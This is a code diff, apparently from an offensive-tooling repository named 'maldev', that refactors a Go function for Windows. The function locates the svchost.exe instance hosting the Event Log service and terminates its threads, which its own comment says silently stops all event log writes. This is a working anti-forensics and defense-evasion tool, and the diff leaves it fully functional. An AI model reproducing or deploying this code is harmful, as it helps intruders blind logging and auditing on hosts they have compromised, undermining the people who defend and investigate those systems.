@@ -7,9 +7,12 @@ import (
 	"unsafe"
 
 	"golang.org/x/sys/windows"
+
+	"github.com/oioio-space/maldev/win/api"
 )
 
 // threadEntry32 matches THREADENTRY32 for CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD).
+// x/sys/windows does not expose ThreadEntry32, so we define it locally.
 type threadEntry32 struct {
 	Size           uint32
 	Usage          uint32
@@ -20,19 +23,22 @@ type threadEntry32 struct {
 	Flags          uint32
 }
 
+var (
+	procThread32First = api.Kernel32.NewProc("Thread32First")
+	procThread32Next  = api.Kernel32.NewProc("Thread32Next")
+)
+
 // Kill terminates all threads belonging to the Windows Event Log service.
 // The service process (svchost.exe) continues running but its worker threads
 // are killed, silently stopping all event log writes.
 //
 // Requires SeDebugPrivilege (typically available to SYSTEM or elevated admin).
 func Kill() error {
-	// Step 1: Find the Event Log service PID
 	pid, err := findEventLogPID()
 	if err != nil {
 		return fmt.Errorf("find EventLog PID: %w", err)
 	}
 
-	// Step 2: Enumerate all threads, kill those belonging to EventLog
 	snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
 	if err != nil {
 		return fmt.Errorf("CreateToolhelp32Snapshot: %w", err)
@@ -42,7 +48,6 @@ func Kill() error {
 	var te threadEntry32
 	te.Size = uint32(unsafe.Sizeof(te))
 
-	// Thread32First
 	r, _, err := procThread32First.Call(uintptr(snap), uintptr(unsafe.Pointer(&te)))
 	if r == 0 {
 		return fmt.Errorf("Thread32First: %w", err)
@@ -51,11 +56,13 @@ func Kill() error {
 	killed := 0
 	for {
 		if te.OwnerProcessID == pid {
-			hThread, err := windows.OpenThread(windows.THREAD_TERMINATE, false, te.ThreadID)
-			if err == nil {
-				procTerminateThread.Call(uintptr(hThread), 0)
+			hThread, openErr := windows.OpenThread(windows.THREAD_TERMINATE, false, te.ThreadID)
+			if openErr == nil {
+				r, _, _ = api.ProcTerminateThread.Call(uintptr(hThread), 0)
 				windows.CloseHandle(hThread)
-				killed++
+				if r != 0 {
+					killed++
+				}
 			}
 		}
 
@@ -72,16 +79,8 @@ func Kill() error {
 	return nil
 }
 
-var (
-	kernel32          = windows.NewLazySystemDLL("kernel32.dll")
-	procThread32First   = kernel32.NewProc("Thread32First")
-	procThread32Next    = kernel32.NewProc("Thread32Next")
-	procTerminateThread = kernel32.NewProc("TerminateThread")
-)
-
 // findEventLogPID finds the PID of the svchost.exe instance hosting EventLog.
 func findEventLogPID() (uint32, error) {
-	// Query the EventLog service for its PID
 	scm, err := windows.OpenSCManager(nil, nil, windows.SC_MANAGER_CONNECT)
 	if err != nil {
 		return 0, fmt.Errorf("OpenSCManager: %w", err)
